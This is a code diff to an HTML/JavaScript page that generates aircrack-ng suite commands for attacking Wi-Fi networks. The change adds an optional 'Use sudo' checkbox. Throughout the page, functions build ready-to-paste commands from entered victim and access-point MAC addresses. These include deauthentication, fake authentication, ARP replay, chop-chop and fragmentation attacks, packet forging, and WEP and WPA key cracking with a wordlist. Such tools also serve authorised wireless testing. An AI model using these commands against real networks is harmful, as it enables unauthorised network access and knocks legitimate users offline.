@@ -52,6 +52,8 @@ body {font-family: Arial;}
 	victim MAC <br>
 	<input type="text" id="victimMAC" style="width:100%" autofocus><br>
 	<input type="button" onclick="myFunction()" value="Submit">
+	<input type="checkbox" id="useSudo" name="useSudo" value="Sudo">
+	<label for="useSudo"> Use sudo</label><br>
 </form>
 <p id="output"></p>
 
@@ -210,7 +212,7 @@ function myFunction() {
 		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
 		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble()
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
-		+ preamble() + "sudo aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
+		+ preamble() + sudo() + "aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
 		+ "</table>";
 		
 	document.getElementById("clientlessWEPoutput").innerHTML = 
@@ -222,7 +224,7 @@ function myFunction() {
 		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName) + postamble()   
 		+ preamble() + packetForge(apMac, mac, deviceName) + postamble() 
 		+ preamble() + replayAttack(deviceName) + postamble()               
-		+ preamble() + "sudo aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
+		+ preamble() + sudo() + "aircrack-ng `ls -t cap1*.cap | head -1`" + postamble()
 		+ "</table>";
 		
 	document.getElementById("wepViaClientOutput").innerHTML = 
@@ -232,7 +234,7 @@ function myFunction() {
 		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
 		+ preamble() + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
 		+ preamble() + packetReplayAttack(apMac, deviceName) + postamble()
-		+ preamble() + "sudo aircrack-ng -z `ls -t cap1*.cap | head -1`" + postamble();
+		+ preamble() + sudo() + "aircrack-ng -z `ls -t cap1*.cap | head -1`" + postamble();
 		+ "</table>";
 		
 	document.getElementById("sharedKeyWEPoutput").innerHTML = 
@@ -244,7 +246,7 @@ function myFunction() {
 		+ preamble() + fakeAuthSK(ssid, apMac, mac, deviceName) + postamble() 
 		+ preamble() + arpRelay(apMac, mac, deviceName) + postamble() 
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
-		+ preamble() + "sudo aircrack-ng `ls -t cap1*.cap | head -1`" + postamble();
+		+ preamble() + sudo() + "aircrack-ng `ls -t cap1*.cap | head -1`" + postamble();
 		+ "</table>";
 		
 	document.getElementById("wpaOutput").innerHTML = 
@@ -253,10 +255,17 @@ function myFunction() {
 		+ preamble() + monitorMode(deviceName, channel) + postamble()
 		+ preamble() + captureCommand(deviceName, channel, apMac) + postamble()
 		+ preamble() + deauthAttack(apMac, victimMac, deviceName) + postamble()
-		+ preamble() + "sudo aircrack-ng -w /usr/share/wordlists/fasttrack.txt `ls -t cap1*.cap | head -1`" + postamble();
+		+ preamble() + sudo() + "aircrack-ng -w /usr/share/wordlists/fasttrack.txt `ls -t cap1*.cap | head -1`" + postamble();
 		+ "</table>";
 }
 
+function sudo() {
+	if (document.getElementById("useSudo").checked) {
+		return "sudo "
+	} else {
+		return ""
+	}
+}
 
 function preamble() {
 	return "<tr><td>";
@@ -271,67 +280,67 @@ function postamble() {
 }
 
 function setup() {
-	return "sudo airmon-ng check kill; sudo airmon-ng check kill";
+	return sudo() + "airmon-ng check kill; sudo airmon-ng check kill";
 }
 
 function captureCommand(device, channel, ssid) {
-	return `sudo airodump-ng ${device} -c ${channel} --bssid ${ssid} -w cap1`
+	return sudo() + `airodump-ng ${device} -c ${channel} --bssid ${ssid} -w cap1`
 }
 
 function monitorMode(device, channel) {
-	return `sudo iwconfig ${device} mode monitor` + copyButton() + "</td><td>" + `airmon-ng start ${device} ${channel}`
+	return sudo() + `iwconfig ${device} mode monitor` + copyButton() + "</td><td>" + sudo() + `airmon-ng start ${device} ${channel}`
 }
 
 function fakeAuth(ssid, apMac, mac, device) {
-	return `sudo aireplay-ng -1 6000 -o 1 -q 10 -e ${ssid} -a ${apMac} -h ${mac} ${device}`
+	return sudo() + `aireplay-ng -1 6000 -o 1 -q 10 -e ${ssid} -a ${apMac} -h ${mac} ${device}`
 }
 
 function arpRelay(apMac, mac, device) {
-	return `sudo aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
+	return sudo() + `aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
 }
 
 function deauthAttack(apMac, victimMac, device) {
 	if (victimMac.length > 0) {
-		return `sudo aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
+		return sudo() + `aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
 	} else {
-		return `sudo aireplay-ng -0 1 -a ${apMac} ${device}`
+		return sudo() + `aireplay-ng -0 1 -a ${apMac} ${device}`
 	}
 }
 
 function chopChopAttack(apMac, mac, device) {
-	return `sudo aireplay-ng -4 -b ${apMac} -h ${mac} ${device}`
+	return sudo() + `aireplay-ng -4 -b ${apMac} -h ${mac} ${device}`
 }
 
 function fragmentationAttack(apMac, mac, device) {
-	return `sudo aireplay-ng -5 -b ${apMac} -h ${mac} ${device}`
+	return sudo() + `aireplay-ng -5 -b ${apMac} -h ${mac} ${device}`
 }
 
 function packetForge(apMac, mac, device) {
-	return `sudo packetforge-ng -0 -a ${apMac} -h ${mac} -l 192.168.1.100 -k 192.168.1.255 -y \`ls -t *.xor | head -1\` -w arpRequest`
+	return sudo() + `packetforge-ng -0 -a ${apMac} -h ${mac} -l 192.168.1.100 -k 192.168.1.255 -y \`ls -t *.xor | head -1\` -w arpRequest`
 }
 
 
 function replayAttack(device) {
-	return `sudo aireplay-ng -2 -r arpRequest ${device}`
+	return sudo() + `aireplay-ng -2 -r arpRequest ${device}`
 }
 
 function packetReplayAttack(apMac, device) {
-	return `sudo aireplay-ng -2 -b ${apMac} -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${device}`
+	return sudo() + `aireplay-ng -2 -b ${apMac} -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${device}`
 }
 
 function fakeAuthSK(ssid, apMac, mac, device) {
-	return `sudo aireplay-ng -1 0 -e ${ssid} -y \`ls -t *.xor | head -1\` -a ${apMac} -h ${mac} ${device}`
+	return sudo() + `aireplay-ng -1 0 -e ${ssid} -y \`ls -t *.xor | head -1\` -a ${apMac} -h ${mac} ${device}`
 }
 
 function arpRelay(apMac, mac, device) {
-	return `sudo aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
+	return sudo() + `aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
 }
 
 function deauthAttack(apMac, victimMac, device) {
 	if (victimMac.length > 0) {
-		return `sudo aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
+		return sudo() + `aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
 	} else {
-		return `sudo aireplay-ng -0 1 -a ${apMac} ${device}`
+		return sudo() + `aireplay-ng -0 1 -a ${apMac} ${device}`
 	}
 }
 </script>
